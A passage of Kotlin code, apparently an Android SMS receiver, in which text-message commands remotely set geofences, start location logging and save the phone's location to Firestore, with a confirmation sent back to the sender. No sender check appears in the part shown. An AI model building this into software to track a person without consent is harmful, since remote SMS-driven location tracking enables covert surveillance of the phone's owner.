                                            val centerLatitude = message.messageBody.removePrefix("GEOFENCE_FROM_ENTERING ").split(" ")[0].toDouble()
                                            val centerLongitude = message.messageBody.removePrefix("GEOFENCE_FROM_ENTERING ").split(" ")[1].toDouble()
                                            val radius = message.messageBody.removePrefix("GEOFENCE_FROM_ENTERING ").split(" ")[2].toInt()
                                            geofenceList.add(
                                                hashMapOf(
                                                    "CenterLatitude" to centerLatitude,
                                                    "CenterLongitude" to centerLongitude,
                                                    "Radius" to radius,
                                                    "Type" to "ENTERING",
                                                    "IsValid" to true,
                                                    "UseSMS" to true
                                                )
                                            )
                                            sendMessage(
                                                context,
                                                true,
                                                "GEOFENCE_FROM_ENTERING: Operation completed successfully",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        } catch (ex: Exception) {
                                            ex.printStackTrace()
                                            sendMessage(context, true, "GEOFENCE_FROM_ENTERING: Operation failed - ${ex.localizedMessage}", serverPhoneNo = message.originatingAddress)
                                        }
                                    } else if (message?.messageBody == "START_LOGGING_LOCATION_UPDATES") {
                                        startLoggingLocation = true
                                        sendMessage(context, true, "START_LOGGING_LOCATION_UPDATES: Operation completed successfully", serverPhoneNo = message.originatingAddress)
                                    } else if (message?.messageBody == "STOP_LOGGING_LOCATION_UPDATES") {
                                        startLoggingLocation = false
                                        sendMessage(context, true, "STOP_LOGGING_LOCATION_UPDATES: Operation completed successfully", serverPhoneNo = message.originatingAddress)
                                    } else if (message?.messageBody?.startsWith("GEOFENCE_FROM_EXITING ") == true) {
                                        try {
                                            val centerLatitude = message.messageBody.removePrefix("GEOFENCE_FROM_EXITING ").split(" ")[0].toDouble()
                                            val centerLongitude = message.messageBody.removePrefix("GEOFENCE_FROM_EXITING ").split(" ")[1].toDouble()
                                            val radius = message.messageBody.removePrefix("GEOFENCE_FROM_EXITING ").split(" ")[2].toInt()
                                            geofenceList.add(
                                                hashMapOf(
                                                    "CenterLatitude" to centerLatitude,
                                                    "CenterLongitude" to centerLongitude,
                                                    "Radius" to radius,
                                                    "Type" to "EXITING",
                                                    "IsValid" to true,
                                                    "UseSMS" to true
                                                )
                                            )
                                            sendMessage(
                                                context,
                                                true,
                                                "GEOFENCE_FROM_EXITING: Geofence Index: ${geofenceList.size - 1}",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        } catch (ex: Exception) {
                                            ex.printStackTrace()
                                            sendMessage(context, true, "GEOFENCE_FROM_EXITING: Operation failed - ${ex.localizedMessage}", serverPhoneNo = message.originatingAddress)
                                        }
                                    } else if (message?.messageBody?.startsWith("MAKE_GEOFENCE_INVALID ") == true) {
                                        try {
                                            val index = message.messageBody.removePrefix("MAKE_GEOFENCE_INVALID ").toInt()
                                            geofenceList[index]["IsValid"] = false
                                            sendMessage(
                                                context,
                                                true,
                                                "MAKE_GEOFENCE_INVALID: Operation completed successfully",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        } catch (ex: Exception) {
                                            ex.printStackTrace()
                                            sendMessage(context, true, "MAKE_GEOFENCE_INVALID: Operation failed - ${ex.localizedMessage}", serverPhoneNo = message.originatingAddress)
                                        }
                                    } else if (message?.messageBody?.startsWith("MAKE_GEOFENCE_VALID ") == true) {
                                        try {
                                            val index = message.messageBody.removePrefix("MAKE_GEOFENCE_VALID ").toInt()
                                            geofenceList[index]["IsValid"] = true
                                            sendMessage(
                                                context,
                                                true,
                                                "MAKE_GEOFENCE_VALID: Operation completed successfully",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        } catch (ex: Exception) {
                                            ex.printStackTrace()
                                            sendMessage(context, true, "MAKE_GEOFENCE_VALID: Operation failed - ${ex.localizedMessage}", serverPhoneNo = message.originatingAddress)
                                        }
                                    } else if (message?.messageBody == "INVALIDATE_AND_CLEAR_ALL_GEOFENCES") {
                                        geofenceList.clear()
                                        sendMessage(context, true, "INVALIDATE_AND_CLEAR_ALL_GEOFENCES: Operation completed successfully", serverPhoneNo = message.originatingAddress)
                                    } else if (message?.messageBody?.startsWith("SEND_GEOFENCE_ALERTS_THROUGH_SMS ") == true) {
                                        try {
                                            val index = message.messageBody.removePrefix("SEND_GEOFENCE_ALERTS_THROUGH_SMS ").toInt()
                                            geofenceList[index]["UseSMS"] = true
                                            sendMessage(
                                                context,
                                                true,
                                                "SEND_GEOFENCE_ALERTS_THROUGH_SMS: Operation completed successfully",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        } catch (ex: Exception) {
                                            ex.printStackTrace()
                                            sendMessage(context, true, "SEND_GEOFENCE_ALERTS_THROUGH_SMS: Operation failed - ${ex.localizedMessage}", serverPhoneNo = message.originatingAddress)
                                        }
                                    } else if (message?.messageBody?.startsWith("SEND_GEOFENCE_ALERTS_THROUGH_FIRESTORE ") == true) {
                                        try {
                                            val index = message.messageBody.removePrefix("SEND_GEOFENCE_ALERTS_THROUGH_FIRESTORE ").toInt()
                                            geofenceList[index]["UseSMS"] = false
                                            sendMessage(context, true, "SEND_GEOFENCE_ALERTS_THROUGH_FIRESTORE: Operation completed successfully", serverPhoneNo = message.originatingAddress)
                                        } catch (ex: Exception) {
                                            ex.printStackTrace()
                                            sendMessage(context, true, "SEND_GEOFENCE_ALERTS_THROUGH_FIRESTORE: Operation failed - ${ex.localizedMessage}", serverPhoneNo = message.originatingAddress)
                                        }
                                    } else if (message?.messageBody == "START_SAVING_CURRENT_LOCATION_IN_FIRESTORE") {
                                        saveCurrentLocationInFirestore = true
                                        sendMessage(
                                            context,
                                            true,
                                            "START_SAVING_CURRENT_LOCATION_IN_FIRESTORE: Operation completed successfully",
                                            serverPhoneNo = message.originatingAddress
                                        )
                                    } else if (message?.messageBody == "STOP_SAVING_CURRENT_LOCATION_IN_FIRESTORE") {
                                        saveCurrentLocationInFirestore = false
                                        sendMessage(
                                            context,
                                            true,
                                            "STOP_SAVING_CURRENT_LOCATION_IN_FIRESTORE: Operation completed successfully",
                                            serverPhoneNo = message.originatingAddress
                                        )
                                    }
                                }
                            }
                        }
                    }
                }
            }
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(
                context,
                true,
                "Uncaught Error: ${ex.localizedMessage}",
                serverPhoneNo = originatingAddress
            )
        }
    }
}
